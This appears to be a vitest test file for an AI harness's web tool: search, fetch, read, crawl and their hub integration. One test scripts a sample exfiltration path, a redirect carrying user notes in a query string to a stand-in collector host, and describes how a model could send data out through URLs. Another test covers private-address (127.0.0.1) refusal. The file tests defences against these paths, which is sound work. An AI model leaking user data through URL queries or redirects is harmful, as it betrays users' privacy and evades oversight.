/**
 * The web system end to end over the SDK's real link runtime: `serve` connects to an in-memory hub (`FakeHub`), sends
 * the manifest, gets its config, and every call below crosses the link as JSON and is checked against the contract on
 * both sides. The page loader is the real one over a scripted `fetch` and a fake browser; search is a fake.
 */
import { mkdtemp, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { createDefaultResourceRegistry } from '@aeye/resources/default';
import { Json, ResourceReadResult, ResourceRecord, mintId, type OutcomeWire, type RunSettled } from '@harness/core';
import { serve, type RunningSystem } from '@harness/sdk/server';
import { FakeHub, TEST_USER } from '@harness/sdk/server/testing';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { z } from 'zod';
import { web } from '../shared/index.ts';
import { webEnv } from './env.ts';
import { createWebImpl, fetchSettings, READ_EMPTY_NOTE, searchCredits, type WebServer } from './impl.ts';
import { PageLoader } from './loader.ts';
import { WebProblem } from './problem.ts';
import { PageTabs } from './renderer.ts';
import { FakeSearch, PUBLIC_DNS, fakeLauncher, html, redirect, scriptedFetch, tableLookup } from './testing.ts';
import { RunUploads } from './uploads.ts';

const settings = { ...webEnv.parse(), TAVILY_API_KEY: 'tvly-env', WEB_TAVILY_CREDIT: 0.01 };

const APP = '<html><head><title>Loading</title><script src="/app.js"></script></head><body><div id="app"></div></body></html>';
const ARTICLE = `<html><head><title>An article</title></head><body><main><h1>An article</h1><p>${'Readable text. '.repeat(40)}</p></main></body></html>`;

function done(outcome: OutcomeWire): Json {
  if (outcome.status !== 'done') { throw new Error(`expected done, got ${JSON.stringify(outcome)}`); }
  return outcome.result;
}

/** A hub resource record for an imported web page, as the hub's `importResource` answers. */
function pageRecord(url: string, finalUrl: string, rendered: boolean): Json {
  return Json.parse(ResourceRecord.parse({
    uri: 'hub://resources/web/article',
    system: 'hub',
    stat: { uri: 'hub://resources/web/article', name: 'An article', type: 'page', mime: 'text/html', format: 'html', version: 'v1' },
    links: [],
    source: { from: 'web', url, finalUrl, fetchedAt: 1, rendered },
    primary: 'markdown',
    seenAt: 1,
  }));
}

describe('web over the link', () => {
  let state: string;
  let hub: FakeHub;
  let search: FakeSearch;
  let server: WebServer;
  let launch: ReturnType<typeof fakeLauncher>;
  let fetchFn: ReturnType<typeof scriptedFetch>;
  let running: RunningSystem<'web'> | undefined;

  beforeEach(async () => {
    state = await mkdtemp(join(tmpdir(), 'harness-web-'));
    search = new FakeSearch({ answer: 'Cats sleep a lot.', results: [{ title: 'Cats', url: 'https://example.com/cats', snippet: 'About cats', score: 0.9 }] });
    fetchFn = scriptedFetch({
      'https://example.com/': html(ARTICLE),
      'https://app.example.com/': () => html(APP),
      'http://127.0.0.1:4300/': html(ARTICLE),
    });
    launch = fakeLauncher((request) => Promise.resolve({ html: '<html><head><title>The app</title></head><body><h1>Rendered</h1></body></html>', url: request.url }));
    const renderers = new PageTabs({ launch, concurrency: 1, timeout: 1_000, idle: 0, userAgent: 'test' });
    const uploads = new RunUploads(state);
    let clock = 1_000;
    server = createWebImpl({
      settings,
      search,
      pages: new PageLoader({ registry: createDefaultResourceRegistry(), fetch: fetchFn, lookup: tableLookup(PUBLIC_DNS), renderers, redirects: 5, userAgent: 'test' }),
      uploads,
      renderers,
      now: () => { clock += 10; return clock; },
    });
    hub = new FakeHub({ config: {} });
    running = await serve(web, server.impl, { hub: 'ws://hub.test/link', state, version: '0.0.0', files: uploads.factory }, hub.host());
    await running.ready();
  });
  afterEach(async () => {
    await running?.stop();
    running = undefined;
    await rm(state, { recursive: true, force: true });
  });

  it('sends a manifest with its fns, the Page type, the mention and the guide', () => {
    const manifest = hub.manifests[0];
    // every fn is in one of its API groups, which the hub indexes (`<system>/api.<group>`)
    expect(manifest?.groups?.map((group) => group.name)).toEqual(['search', 'pages']);
    for (const decl of manifest?.fns ?? []) { expect(['search', 'pages'], decl.name).toContain(decl.group); }
    expect(manifest?.name).toBe('web');
    const fns = new Map(manifest?.fns.map((f) => [f.name, f]));
    for (const decl of manifest?.fns ?? []) {
      expect(decl.instructions, decl.name).toBeTruthy();
      expect(decl.examples?.length ?? 0, decl.name).toBeGreaterThan(0);
      // search, read and crawl keep what they fetch as hub resources, a read side effect (Phil, 2026-11-22)
      expect(decl.effects, decl.name).toEqual(decl.name === 'fetch_raw' ? { mode: 'read' } : { mode: 'read', keeps: ['resources'] });
    }
    expect(fns.get('search')?.tags).toContain('read');
    expect(fns.get('read')?.tags).toContain('read');
    expect(fns.get('fetch_raw')).toMatchObject({ visibility: 'none', display: 'hidden' });
    const text = JSON.stringify(manifest);
    for (const name of ['Page', 'pages', 'guide', 'hub/resource_import', 'hub/resource_read']) { expect(text).toContain(`"${name}"`); }
  });

  it('searches with the config\'s key over the system\'s, keeps the results as a hub resource, and reports the credits to the budget', async () => {
    hub.onCall = (call): Promise<RunSettled> => Promise.resolve(call.fn === 'hub/resource_import'
      ? { status: 'done', result: Json.parse(ResourceRecord.parse({
        uri: 'hub://resources/searches/cats', system: 'hub', links: [], primary: 'markdown', seenAt: 1,
        stat: { uri: 'hub://resources/searches/cats', name: 'Web search: cats', type: 'file', mime: 'text/markdown', format: 'markdown', version: 'v1' },
      })) }
      : { status: 'done', result: null });
    const basic = await hub.run('web/search', { query: 'cats' });
    expect(basic).toMatchObject({ cost: 0.01 });
    expect(done(basic)).toEqual({ answer: 'Cats sleep a lot.', results: [{ title: 'Cats', url: 'https://example.com/cats', snippet: 'About cats', score: 0.9 }], uri: 'hub://resources/searches/cats' });
    const imported = hub.calls.find((call) => call.fn === 'hub/resource_import')?.args;
    expect(imported).toMatchObject({ name: 'Web search: cats', content: { mime: 'text/markdown' } });
    const hash = JSON.stringify(imported).match(/"hash":"([^"]+)"/)?.[1] ?? '';
    const page = new TextDecoder().decode(hub.content.get(hash));
    expect(page).toContain('# Web search: cats');
    expect(page).toContain('## 1. [Cats](https://example.com/cats)');
    expect(page).toContain('About cats');
    expect(search.asked.at(-1)?.key).toBe('tvly-env');
    await hub.configure({ tavilyKey: 'tvly-config' });
    expect(await hub.run('web/search', { query: 'dogs', depth: 'advanced' })).toMatchObject({ status: 'done', cost: 0.02 });
    expect(search.asked.at(-1)).toMatchObject({ key: 'tvly-config', args: { query: 'dogs', depth: 'advanced' } });
  });

  it('fails a search as the problem says, and charges nothing for it', async () => {
    search.results = new WebProblem('no-search-key', 'No key');
    const failed = await hub.run('web/search', { query: 'cats' });
    expect(failed).toMatchObject({ status: 'failed', error: { class: 'fatal', code: 'no-search-key' } });
    expect(failed).not.toHaveProperty('cost');
  });

  it('fetches a plain page raw for the hub: bytes uploaded by ref, its title, not rendered', async () => {
    const result = done(await hub.run('web/fetch_raw', { url: 'https://example.com/' }));
    expect(result).toMatchObject({ mime: 'text/html', finalUrl: 'https://example.com/', status: 200, rendered: false, title: 'An article' });
    const ref = typeof result === 'object' && result !== null && !Array.isArray(result) ? result['content'] : undefined;
    const hash = typeof ref === 'object' && ref !== null && !Array.isArray(ref) ? ref['hash'] : undefined;
    expect(typeof hash === 'string' ? new TextDecoder().decode(hub.content.get(hash)) : undefined).toBe(ARTICLE);
  });

  it('renders an empty app root before handing it over, under auto', async () => {
    expect(done(await hub.run('web/fetch_raw', { url: 'https://app.example.com/' }))).toMatchObject({ rendered: true, title: 'The app' });
    expect(launch.browsers).toHaveLength(1);
    expect(done(await hub.run('web/fetch_raw', { url: 'https://app.example.com/', render: 'never' }))).toMatchObject({ rendered: false, title: 'Loading' });
  });

  it('refuses 127.0.0.1 as the caller\'s problem, unless the config allows private addresses', async () => {
    expect(await hub.run('web/fetch_raw', { url: 'http://127.0.0.1:4300/' })).toMatchObject({ status: 'failed', error: { class: 'caller', code: 'private-address' } });
    expect(fetchFn.seen.some((r) => r.url.startsWith('http://127.0.0.1'))).toBe(false);
    await hub.configure({ allowPrivate: true });
    expect(done(await hub.run('web/fetch_raw', { url: 'http://127.0.0.1:4300/' }))).toMatchObject({ title: 'An article' });
  });

  it('reads a page through the hub: imports it and reads its primary form', async () => {
    const calls: Array<{ fn: string; args: Json }> = [];
    hub.onCall = (call): Promise<RunSettled> => {
      calls.push({ fn: call.fn, args: call.args });
      if (call.fn === 'hub/resource_import') { return Promise.resolve({ status: 'done', result: pageRecord('https://example.com/', 'https://example.com/', true) }); }
      const read = Json.parse(ResourceReadResult.parse({ uri: 'hub://resources/web/article', form: 'markdown', text: '# An article\n\nReadable text.', offset: 0, total: 600, truncated: true, forms: ['markdown'], offers: [] }));
      return Promise.resolve({ status: 'done', result: read });
    };
    const result = done(await hub.run('web/read', { url: 'example.com', render: 'always', maxChars: 40 }));
    expect(result).toEqual({ uri: 'hub://resources/web/article', title: 'An article', finalUrl: 'https://example.com/', text: '# An article\n\nReadable text.', truncated: true, rendered: true, fetched: ['https://example.com/'] });
    // the hub's import takes back the page this run fetched, so it goes out once
    expect(fetchFn.seen.filter((r) => r.url === 'https://example.com/')).toHaveLength(1);
    expect(server.held.size).toBe(1);
    expect(calls).toEqual([
      { fn: 'hub/resource_import', args: { url: 'https://example.com/', render: 'always' } },
      { fn: 'hub/resource_read', args: { uri: 'hub://resources/web/article', maxChars: 40 } },
    ]);
  });

  it('offers a typed URL as a mention over the link, and tells the LLM to read it', async () => {
    const time = { now: 0, timeZone: 'UTC', local: '1970-01-01T00:00:00Z' };
    const asker = { session: mintId('session'), actor: TEST_USER.id, user: TEST_USER, time };
    const options = await hub.peer().call('mentions', { ...asker, provider: 'pages', query: 'example.com/new', request: mintId('mentionRequest') });
    expect(options[0]).toMatchObject({ label: 'example.com · new', target: { url: 'https://example.com/new' } });
    const text = await hub.peer().call('mentionText', { ...asker, provider: 'pages', target: { url: 'https://example.com/new' } });
    expect(text.text).toContain('web/read {"url":"https://example.com/new"}');
  });

  it('reads with the system\'s default length, and fails as the hub\'s call failed', async () => {
    hub.onCall = (call): Promise<RunSettled> => (call.fn === 'hub/resource_import'
      ? Promise.resolve({ status: 'failed', error: { class: 'caller', message: 'example.com answered 404 Not Found.', code: 'http-status' } })
      : Promise.resolve({ status: 'cancelled' }));
    expect(await hub.run('web/read', { url: 'https://example.com/missing' })).toMatchObject({ status: 'failed', error: { class: 'caller', code: 'http-status', message: expect.stringMatching(/^https:\/\/example\.com\/missing answered 404 Not Found\. The page was not read, so nothing it says is confirmed/) } });
    hub.onCall = (call): Promise<RunSettled> => (call.fn === 'hub/resource_import'
      ? Promise.resolve({ status: 'done', result: pageRecord('https://example.com/', 'https://example.com/', false) })
      : Promise.resolve({ status: 'cancelled' }));
    expect((await hub.run('web/read', { url: 'https://example.com/' })).status).toBe('cancelled');
    expect(hub.calls.at(-1)?.args).toEqual({ uri: 'hub://resources/web/article', maxChars: settings.WEB_READ_CHARS });
  });

  it('passes on what part of a cut page it read, and says when a page read empty', async () => {
    const reading = (text: string, total: number, partial?: string): RunSettled => ({
      status: 'done',
      result: { uri: 'hub://resources/web/article', form: 'markdown', text, offset: 0, total, truncated: partial !== undefined, ...(partial === undefined ? {} : { partial }), forms: ['markdown'], offers: [] },
    });
    const partial = 'Partial: characters 1–5 of 50 are here; 45 characters were left out. To get the rest, read on.';
    hub.onCall = (call): Promise<RunSettled> => Promise.resolve(call.fn === 'hub/resource_import'
      ? { status: 'done', result: pageRecord('https://example.com/', 'https://example.com/', false) }
      : reading('Hello', 50, partial));
    expect(done(await hub.run('web/read', { url: 'https://example.com/' }))).toMatchObject({ text: 'Hello', truncated: true, partial });
    hub.onCall = (call): Promise<RunSettled> => Promise.resolve(call.fn === 'hub/resource_import'
      ? { status: 'done', result: pageRecord('https://app.example.com/', 'https://app.example.com/', true) }
      : reading('', 0));
    expect(done(await hub.run('web/read', { url: 'https://app.example.com/' }))).toMatchObject({ text: '', note: READ_EMPTY_NOTE });
  });

  it('crawls a site into one folder, hands the hub the page it fetched, and reports the root', async () => {
    let fetchedBack: Json = null;
    hub.onCall = async (): Promise<RunSettled> => {
      fetchedBack = done(await hub.run('web/fetch_raw', { url: 'https://example.com/' }));
      return { status: 'done', result: pageRecord('https://example.com/', 'https://example.com/', false) };
    };
    const result = done(await hub.run('web/crawl', { url: 'https://example.com/', maxPages: 500 }));
    expect(result).toMatchObject({ count: 1, root: 'hub://resources/web', moreSkipped: 0 });
    const asked = hub.calls.find((call) => call.fn === 'hub/resource_import')?.args;
    const input = z.object({ url: z.string(), folder: z.string() }).strict().parse(asked);
    expect(input.url).toBe('https://example.com/');
    expect(input.folder).toMatch(/^crawls\/example\.com-\d{8}-\d{4}$/);
    expect(fetchedBack).toMatchObject({ title: 'An article' });
    expect(fetchFn.seen.filter((r) => r.url === 'https://example.com/')).toHaveLength(1);
    expect(server.held.size).toBe(0);
    // the run says every URL that went out, robots.txt included
    expect([...z.object({ fetched: z.array(z.string()) }).parse(result).fetched].sort()).toEqual(['https://example.com/', 'https://example.com/robots.txt']);
  });

  it('says on a read every URL that went out, each redirect and its query included, so a model can’t send data out unseen', async () => {
    const leak = 'https://collector.example.com/x?d=more-of-the-notes';
    const table: Record<string, Response> = {
      'https://example.com/go?d=the-users-notes': redirect(leak),
      [leak]: redirect('https://www.example.com/landing'),
      'https://www.example.com/landing': html(ARTICLE),
    };
    const lookup = tableLookup({ ...PUBLIC_DNS, 'collector.example.com': ['93.184.215.20'] });
    const pages = new PageLoader({ registry: createDefaultResourceRegistry(), fetch: (input) => Promise.resolve(table[input] ?? new Response('', { status: 404 })), lookup, renderers: new PageTabs({ launch, concurrency: 1, timeout: 1_000, idle: 0, userAgent: 'test' }), redirects: 5, userAgent: 'test' });
    const page = await pages.fetch('https://example.com/go?d=the-users-notes', { render: 'never', allowPrivate: false, maxBytes: 100_000, timeout: 1_000 });
    expect(page.fetched).toEqual(['https://example.com/go?d=the-users-notes', leak, 'https://www.example.com/landing']);
  });

  it('refuses something that is not a URL as invalid input, without asking the hub or the network', async () => {
    for (const fn of ['web/read', 'web/fetch_raw', 'web/crawl'] as const) {
      expect(await hub.run(fn, { url: 'not a url' })).toMatchObject({ status: 'invalid-input', invalid: { problems: [{ path: 'url' }] } });
      expect(await hub.run(fn, { url: 'ftp://example.com/file' })).toMatchObject({ status: 'invalid-input' });
    }
    expect(hub.calls).toHaveLength(0);
    expect(fetchFn.seen).toHaveLength(0);
  });
});

describe('impl helpers', () => {
  it('takes fetch settings from the call, then the config, then the environment', () => {
    expect(fetchSettings({}, settings, undefined)).toEqual({ render: settings.WEB_RENDER, allowPrivate: false, maxBytes: settings.WEB_MAX_BYTES, timeout: settings.WEB_TIMEOUT });
    expect(fetchSettings({ render: 'never', allowPrivate: true, maxBytes: 2_048, timeout: 5_000 }, settings, 'always')).toEqual({ render: 'always', allowPrivate: true, maxBytes: 2_048, timeout: 5_000 });
  });

  it('counts Tavily credits by depth', () => {
    expect(searchCredits(undefined)).toBe(1);
    expect(searchCredits('basic')).toBe(1);
    expect(searchCredits('advanced')).toBe(2);
  });
});
